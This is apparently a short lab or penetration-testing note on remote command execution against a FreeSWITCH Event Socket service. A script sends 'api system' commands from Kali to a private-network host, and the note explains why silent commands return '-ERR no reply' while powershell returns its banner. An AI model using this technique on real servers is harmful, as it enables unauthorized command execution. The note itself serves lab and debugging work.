# FreeSWITCH ESL: what "-ERR no reply" actually means
#
# All commands below are wrapped by 1.py, which sends "api system <cmd>" and prints
# the raw response. Every one of these returned Content-Length: 14 and the body
# "-ERR no reply".

# On Kali
python3 1.py 192.168.137.151 "pwd"
python3 1.py 192.168.137.151 "cd \scripts"
python3 1.py 192.168.137.151 "pscore6"

Authenticated
Content-Type: api/response
Content-Length: 14

-ERR no reply

# ...while a command that writes to stdout returns normally:

# On Kali
python3 1.py 192.168.137.151 "powershell"
Authenticated
Content-Type: api/response
Content-Length: 172

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Program Files\FreeSWITCH>

# Conclusion: "-ERR no reply" is ESL's answer for "the api command produced no stdout".
# It is not an error report and it does not mean the command failed to run.
# - pwd          : not a cmd.exe builtin; PowerShell alias does not exist in cmd, error goes to stderr
# - cd \scripts  : succeeds silently, and the cwd dies with the process
# - pscore6      : echoed footer text from the previous banner, not a command at all
